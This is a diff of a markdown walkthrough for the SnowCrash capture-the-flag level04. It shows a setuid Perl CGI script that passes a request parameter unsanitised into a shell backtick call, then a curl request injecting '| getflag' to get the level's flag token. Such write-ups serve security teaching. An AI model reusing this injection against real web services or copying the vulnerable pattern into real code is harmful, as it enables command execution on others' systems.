@@ -1,56 +1,39 @@
 # level04
 
-- We log as `level04`
+- We login as user level04.
+```
+level04@SnowCrash:~$ ls -l
+total 4
+-rwsr-sr-x 1 flag04 level04 152 Mar  5  2016 level04.pl
 
-- We found two perl scripts, both named `level04.pl` , the first in the `home/user/level04` and the other one in `/var/www/level04`
-
-- The content of both file is identical:
-```perl
+level04@SnowCrash:~$ cat ./level04.pl
 #!/usr/bin/perl
 # localhost:4747
 use CGI qw{param};
 print "Content-type: text/html\n\n";
 sub x {
-	$y = $_[0];
-	print `echo $y 2>&1`;
+  $y = $_[0];
+  print `echo $y 2>&1`;
 }
 x(param("x"));
 ```
-- The permissions are different for each files:
 
-	`home/user/level04/level04.pl:`
->`-rwsr-sr-x 1 flag04 level04 152 Mar 5 2016 level04.pl`
 
-	`var/www/level04.pl:`
->`-r-xr-x---+ 1 flag04 level04 152 Aug 17 22:43 level04.pl`
-
-- The seconf file has extended permissions:
+- Our home directory contains a Perl script that appears to be designed to be executed by a [CGI](https://en.wikipedia.org/wiki/Common_Gateway_Interface) through a service listening on `localhost:4747`.
+The script calls the function `x()` with the parameter `x` retrieved from the CGI. The function `x()` `echo` the parameter it receives.
+Therefore, if the parameter `x` is `| getflag`, this script will execute `echo | getflag`.
 ```
-# file: level04.pl
-# owner: flag04
-# group: level04
-user::r-x
-group::r-x
-group:www-data:r-x
-mask::r-x
-other::---
+level04@SnowCrash:~$ netstat -tuln | grep 4747
+tcp6       0      0 :::4747                 :::*                    LISTEN
 ```
 
-- With all those elements we can conclude that:
-	- `#!/usr/bin/perl` - This script is written in perl
-	- `use CGI qw{param};` - It is a CGI
-	- `group:www-data:r-x` - It is used by a web service
-	- `x(param("x"));` - It takes a parameter `x` and pass it to the function `x`
-	- `$y = $_[0];` - It stores the parameter in `y`
-	- `print 'echo $y 2>&1';` - `y` is run through `echo` without any parsing
-	- `# localhost:4747` - The web service is running on port `4747`
 
-- This means the parameter of this CGI is probably vulnerable to command injection
+- There is indeed a service listening on all addresses through port 4747.
+```
+level04@SnowCrash:~$ curl -X POST -d "x=| getflag" http://localhost:4747
+Check flag.Here is your token : ne2searoevaevoem4ov4ar8ap
 
-- We try executing the CGI using `curl -X POST -d "x= $PWD" http://localhost:4747`
-
-- We can read `/var/www/level04` the `PWD` environment variable was successfully passed to `echo`
-
-- We try injecting the `getflag` command using a pipe: `curl -X POST -d "x= | getflag" http://localhost:4747`
-
-- We get the flag: `ne2searoevaevoem4ov4ar8ap`
+level04@SnowCrash:~$ su level05
+Password:ne2searoevaevoem4ov4ar8ap
+level05@SnowCrash:~$
+```
